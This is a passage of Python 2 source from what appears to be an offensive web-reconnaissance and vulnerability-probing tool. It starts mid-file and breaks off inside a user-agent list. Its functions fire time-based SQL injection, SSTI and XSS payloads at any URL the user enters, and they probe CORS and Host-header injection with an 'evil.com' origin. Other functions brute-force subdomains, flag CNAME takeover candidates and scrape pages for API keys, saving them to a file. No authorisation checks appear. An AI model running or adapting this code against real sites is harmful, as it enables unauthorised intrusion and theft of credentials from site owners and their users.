	print("* \033[1;91;40mNote :\033[0m\033[1;96m If you see 'Sorry! Something went wrong.' error on the page, it means that API key is not allowed to be used at JavaScript API.")
	print("Operation is over. :)")

def hidden_params():
	hidden = {
			'Hidden_Params'  : r'type="hidden".*?name="(.*?)"',
			'hid' : r'name="(.*?)".*?type="hidden"'
		}
	public = {
			'input_Params'  : r'<input.*?name="(.*?)"',
			'input_params2' : r'<input name="(.*?)".*?'
		}
	try:
		link = raw_input("\n\t\033[1;95m[?] \033[1;92mEntre Your Url With [https://] : ")
		check = requests.get(link).content
	except:
		print("      \t\t\033[1;91m[-] Entre Valid Url -_- ")
		sys.exit()
	slowprint("\n\t\033[1;40;95m........ \033[1;91mStart Finding Params \033[1;95m........\033[0m \n")
	for hidden1 in hidden:
		hidden1 = hidden1.rstrip()
		re_check = re.findall(hidden[hidden1], check)
		for params in re_check:
			params = params.rstrip()
			if params not in xnober:
				xnober.append(params)
				print("\033[1;92m[+] \033[1;96;40mhidden\033[0m \033[1;92mParametre Found : \033[1;40;96m" + params + "\033[0m")
			else:
				pass
				#print("Exist Param : " + params)
	print("\n")
	for public1 in public:
		public1 = public1.rstrip()
		re_check = re.findall(public[public1], check)
		for params in re_check:
			params = params.rstrip()
			if params not in xnober:
				xnober.append(params)
				print("\033[1;92m[+] \033[1;93;40mPublic\033[0m \033[1;92mParametre Found : \033[1;40;93m" + params + "\033[0m")
			else:
				pass
	print("\n")
	re_check2 = re.findall(r'name="(.*?)"', check)
	for params in re_check2:
		params = params.rstrip()
		if params not in xnober:
			xnober.append(params)
			print("\033[1;92m[?] \033[1;94;40mUnknown\033[0m \033[1;92mParametre Found : \033[1;94;40m" + params + "\033[0m")
		else:
			pass

def Waybackurls():

	url_list1 = []
	list_url2 = []
	dzeb_list = []

	black_listdz = (".jpg" , ".png" , ".png?" , ".gif" , ".wav" , ".jpeg" , ".ico" , ".svg" , ".eot" , ".ttf" , ".woff" , "css", "woff2", ".pdf")
	jsextension = ('.js' or '.js?' or ".json" or ".json?")


	black_list = []
	black_list2 = []
	final_uris = []

	url = raw_input(" * Entre Domain Without [HTTP://]: ")
	slowprint("\n\t\033[1;40;95m........ \033[1;91mStart Finding URL | Subdomains \033[1;95m........\033[0m \n")
	web = "https://web.archive.org/cdx/search/cdx?url=*." + url +"/*&output=txt&fl=original&collapse=urlkey&page=/"
	web_rq = requests.get(web).content
	web_rq1 = url_list1.append(web_rq.split())
	flat_list = [item for sublist in url_list1 for item in sublist]
	for x in flat_list:
		x = x.rstrip()
		if x not in black_list:
			if x.endswith(black_listdz):
				pass
			elif (str(jsextension) in x):
				black_list.append(x)
				open('output/Waybackurls/js_link.txt', 'a').write(x + '\n')
				print("\033[1;93mJS File: " + x)
			elif "/." in x:
				black_list.append(x)
				open('output/Waybackurls/Sientive_Data.txt', 'a').write(x + '\n')
				print("\033[1;93mSientive File: " + x)
			elif "=" in x:
				parsed = list(set(re.findall(r'.*?:\/\/.*\?.*\=[^$]' , x)))
				for i in parsed:
					delim = i.find(r'=')
					if (i[:delim+1] + "Kil3r" not in black_list):
						black_list.append(i[:delim+1] + "Kil3r")
						open('output/Waybackurls/_params.txt', 'a').write(i[:delim+1] + "Kil3r\n")
						print("\033[1;94mParams : " + i[:delim+1] + "Kil3r")
					else:
						pass
			elif ".txt" in x:
				black_list.append(x)
				open('output/Waybackurls/text_link.txt', 'a').write(x + '\n')
				print("\033[1;95mFile TxT : " + x)
			elif x.endswith("/"):
				black_list.append(x)
				open('output/Waybackurls/Directory.txt', 'a').write(x + '\n')
				print("\033[1;95mDirectory : " + x)
			else:
				black_list.append(x)
				open('output/Waybackurls/unknown_link.txt', 'a').write(x + '\n')
				print("\033[1;96mUnknown : " + x)
		else:
			print("Deja exist: " + x)
		#######################################
	print("----------- SubDomain *-----------s")
	for dido in black_list:
		if "www." not in dido:
			urlj = urlparse(dido)
			samt = urlj.netloc
			if samt not in black_list2:
				black_list2.append(samt)
				open('output/Waybackurls/Sub_Finder.txt', 'a').write("http://" + samt + "/" + '\n')
				print("http://" + samt + "/")
			else:
				pass
		else:
			pass

def sql_check(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				for sql_time in sql_time_based:
					sql_time = sql_time.rstrip()
					zebi = papa.replace("=" + qwd5 + "&", str("=" + qwd5 + sql_time + "&"))
					zebi = zebi.replace('&mami', "")
					zebi2 = requests.get(zebi, cookies=cookies,verify=True)
					if "0:00:2" in str(zebi2.elapsed):
						print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "SQL_Blind" + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mTime [  ' + '\033[1;92m'+ str(zebi2.elapsed) +'\033[1;93m'+ '  ]\033[1;96m' , zebi)
						open('SQL.txt', 'a').write(zebi + '\n')
					else:
						print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO SQL' + '\033[1;93m' +  ' ] \033[1;91m| '+  '\033[1;93mTime [  ' + '\033[1;91m'+ str(zebi2.elapsed) +'\033[1;93m'+ '  ]\033[1;96m', zebi)
		elif "=" in url and "&" not in url:
				papa = url + '#nemi'
				end = re.findall("=(.*?)#nemi", papa)
				harami = papa.replace("#nemi", "'")
				for sql_time in sql_time_based:
					sql_time = sql_time.rstrip()
					harami2 = papa.replace("#nemi", str(sql_time))
					kill3r2 = requests.get(harami2, cookies=cookies, verify=True)
					if "0:00:2" in str(kill3r2.elapsed):
						print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "SQL_Blind" + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mTime [  ' + '\033[1;92m'+ str(kill3r2.elapsed) +'\033[1;93m'+ '  ]\033[1;96m' , harami2)
						open('SQL.txt', 'a').write(harami2 + '\n')
					else:
						print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO SQL' + '\033[1;93m' +  ' ] \033[1;91m| '+  '\033[1;93mTime [  ' + '\033[1;91m'+ str(kill3r2.elapsed) +'\033[1;93m'+ '  ]\033[1;96m', harami2)
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan SQL' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except:
		pass	

def cors(url):
	try:
		Cors1 = {'Origin': 'evil.com'}
		okey = requests.get(url, headers=Cors1, cookies=cookies,verify=True, timeout=5)  
		if "evil.com" in okey.headers['Access-Control-Allow-Origin'] and 'true' in okey.headers['Access-Control-Allow-Credentials']:
			print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "CORS Misconfiguration" + '\033[1;93m' +  ' ] \033[1;96m ', url)
			open('CORS_Misconfiguration.txt', 'a').write(url + '\n')
		else:
			print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO CORS' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except:
		print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO CORS' + '\033[1;93m' +  ' ] \033[1;96m ', url)

def nmap():
	dzdz = "http://api.hackertarget.com/nmap/?q="
	kok = raw_input("\n\033[1;96m\t [+] Entre Your Host Or IP: ")
	if kok[:7] == "http://":
		kok = kok.replace("http://","")
	if kok[:8] == "https://":
		kok = kok.replace("https://", "")
	if kok[-1] == "/":
		kok = kok.replace("/","")
	opendz = requests.get(dzdz + str(kok)).content
	print("\033[1;92m" + opendz)

def X_Forwarded(url):
	try:
	    hostheader = {'X-Forwarded-Host': 'evil.com'}
	    hostheader2 = {'Host': 'evil.com'}
	    okey1 = requests.get(url, headers=hostheader, cookies=cookies,verify=True, timeout=5)
	    okey2 = requests.get(url, headers=hostheader2, cookies=cookies,verify=True, timeout=5)
	    if "evil.com" in okey1.content:
	    	print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "X-Forwarded-Host" + '\033[1;93m' +  ' ] \033[1;96m ', url)
	    	open('Host_Injection.txt', 'a').write(url + '\n')
	    elif ("http://evil.com" or "Evil.Com - We get it...Daily.") in okey2.content:
	    	print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "Host Header Injection" + '\033[1;93m' +  ' ] \033[1;96m ', url)
	    	open('Host_Injection.txt', 'a').write(url + '\n')
	    else:
	    	print('\033[1;93mVuln [ ' + '\033[1;91m' + 'No Host Header Injection' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except requests.exceptions.RequestException as xxws:  # This is the correct syntax
		pass
def key_finder(url):
	try:
		for i in regex:
			i = i.rstrip()
			print("\033[1;91m[Api_Name] [" + i + "]",url + " |No Scrapping :(|", end='                                                                                                  \r')
			check_link = requests.get(url,allow_redirects=False, timeout=5).content
			okey = re.findall(regex[i], check_link)
			for az in okey:
				az = az.rstrip()
				print('\033[1;93m [ ' + '\033[1;92m' + str(i) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93m [  ' + '\033[1;92m'+ str(az) +'\033[1;93m'+ '  ]\033[1;96m' ,url)
				open('output/secret_key.txt', 'a').write("ApiName: "+ i + "  Key: "+str(az) + " URL: "+ url + '\n')
	except:
		print('timeout', url)
def ssti_check(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				try:
					for nini in ssti_payload:
						nini = nini.rstrip()
						kaka = papa.replace("=" + qwd5 + "&", "=" + nini + "&")
						kaka = kaka.replace('&mami', '')
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						#qaqa = requests.get()
						if ssti_payload[nini] in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "SSTI Injection" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							open('SSTI.txt', 'a').write(kaka + '\n')
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'No SSTI Injection' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
				except requests.exceptions.RequestException as edgd:  # This is the correct syntax
					print (edgd)
					pass
		elif "=" in url and "&" not in url:
			papa = url + '#nemi'
			end = re.findall("=(.*?)#nemi", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				try:
					for nini in ssti_payload:
						nini = nini.rstrip()
						kaka = papa.replace(qwd5, nini)
						kaka = kaka.replace('#nemi', '')
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						if ssti_payload[nini] in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "SSTI Injection" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							open('ssti.txt', 'a').write(kaka + '\n')
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'No SSTI Injection' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
				except requests.exceptions.RequestException as edgd11:  # This is the correct syntax
					print (edgd11)
					pass
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan SSTI' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
	except:
		pass

def xsser(url):
	try:
		if "=" and "&" in url:
			papa = url + '&mami'
			end = re.findall("=(.*?)&", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				mami = papa.replace("=" + qwd5 + "&", "="+'Kil3rDz98HunTINg'+"&")
				mami = mami.replace('&mami', '')
				dz4 = requests.get(mami, cookies=cookies,verify=True, timeout=5)
				if 'Kil3rDz98HunTINg' in dz4.content:
					print('\033[1;96mOps [ ' + '\033[1;92m' + "Possible Xss" + '\033[1;93m' +  ' ] \033[1;96m ', mami)
					open('Possible_Xss.txt', 'a').write(mami + '\n')
					try:
						for nini in xss_payload:
							nini = nini.rstrip()
							kaka = papa.replace(qwd5, nini)
							kaka = kaka.replace('&mami', '')
							testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
							if xss_payload[nini] in testy.content:
								print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "XSS Reflected" + '\033[1;93m' +  ' ] \033[1;92m ', kaka)
								open('XSS_Reflected.txt', 'a').write(kaka + '\n')
							elif 'Attention Required! | Cloudflare' in testy.content:
								print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
							else:
								print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO XSS' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
					except requests.exceptions.RequestException as edgd:  # This is the correct syntax
						print (edgd)
						pass
				else:
					print('\033[1;93mVuln [ ' + '\033[1;91m' + "Can't Scan Xss" + '\033[1;93m' +  ' ] \033[1;96m ', mami)

		elif "=" in url and "&" not in url:
			papa = url + '#nemi'
			end = re.findall("=(.*?)#nemi", papa)
			for qwd5 in end:
				qwd5 = qwd5.rstrip()
				mami = papa.replace(qwd5, 'Kil3rDz98HunTINg')
				mami = mami.replace('#nemi', '')
				dz5 = requests.get(mami, cookies=cookies,verify=True, timeout=5)
				if 'Kil3rDz98HunTINg' in dz5.content:
					print('\033[1;96mOps [ ' + '\033[1;92m' + "Possible Xss" + '\033[1;93m' +  ' ] \033[1;96m ', mami)
					open('Possible_Xss.txt', 'a').write(mami + '\n')
					for nini in xss_payload:
						nini = nini.rstrip()
						kaka = papa.replace(qwd5, nini)
						kaka = kaka.replace('#nemi', '')
						testy = requests.get(kaka, cookies=cookies,verify=True, timeout=5)
						if xss_payload[nini] in testy.content:
							print('\033[1;93mVuln Found [ ' + '\033[1;92m' + "XSS Reflected" + '\033[1;93m' +  ' ] \033[1;92m ', kaka)
							open('XSS_Reflected.txt', 'a').write(kaka + '\n')
						elif 'Attention Required! | Cloudflare' in testy.content:
							print('\033[1;93m[ ' + '\033[1;92m' + "Attention Required! | Cloudflare" + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
						else:
							print('\033[1;93mVuln [ ' + '\033[1;91m' + 'NO XSS' + '\033[1;93m' +  ' ] \033[1;96m ', kaka)
				else:
					print('\033[1;93mVuln [ ' + '\033[1;91m' + "Can't Scan Xss" + '\033[1;93m' +  ' ] \033[1;96m ', mami)
		else:
			print('\033[1;93mERROR [ ' + '\033[1;91m' + 'No Params For Scan XSS' + '\033[1;93m' +  ' ] \033[1;96m ', url)
	except:
		pass

def fuzz(wordlist):
	link = str("http://" + wordlist) + "." + Doamin
	try:
		check = requests.get(link, allow_redirects=False, timeout=5)
		check2 = requests.get(link, allow_redirects=True, timeout=5)
		if check.status_code == 200:
			print('\033[1;93mStatus [ ' + '\033[1;92m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;92m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link)
			open('_200_.txt', 'a').write(link + '\n')
		elif (check.status_code == 301 or check.status_code == 302):
			print('\033[1;93mStatus [ ' + '\033[1;94m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;94m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link)
			open('_301_.txt', 'a').write(link + '\n')
		elif check.status_code == 500:
			print('\033[1;93mStatus [ ' + '\033[1;95m' + str(check.status_code) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mContent [  ' + '\033[1;95m'+ str(check.headers.get('Content-Length')) +'\033[1;93m'+ '  ]\033[1;96m' , link)
			open('_500_.txt', 'a').write(link + '\n')
		else:
			print('\033[1;93mStatus [ ' + '\033[1;91m' + str(check.status_code) + '\033[1;93m' +' ] \033[1;91m| ' ,  '\033[1;93mContent [  ' + '\033[1;91m' + str(check.headers.get('Content-Length')) + '\033[1;93m' + '  ]\033[1;96m' , link)
	except:
		print("\033[1;91m[ERROR Host] [" + link + "]", end='                                                                   \r')

def ws3(wordlist):
	link = str(wordlist) + "." + Doamin
	try:
		cname = dns.resolver.query(link, 'CNAME')
		for iid in cname.response.answer:
			for jsk in iid.items:
				print('\033[1;93mTarget [ ' + '\033[1;92m' + str(link) + '\033[1;93m' +  ' ] \033[1;91m| ',  '\033[1;93mCNAME [  ' + '\033[1;92m'+ str(jsk.to_text()) +'\033[1;93m'+ '  ]')#\033[1;96m' , link)
				open('output/Takeover_.txt', 'a').write(link + " - CNAME ----> " + str(jsk.to_text()) + '\n')
	except:
		print('\033[1;93mCNAME [ ' + '\033[1;91m' + 'No Resloved :(' + '\033[1;93m' +  ' ] \033[1;96m ', link)
	
def path(path):
	mylist = ["Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:25.0) Gecko/20100101 Firefox/25.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4","Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.58","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2","Mozilla/5.0 (Windows NT 5.1; rv:25.0) Gecko/20100101 Firefox/25.0","Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0","Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1","Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2","Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0","Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0","Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) 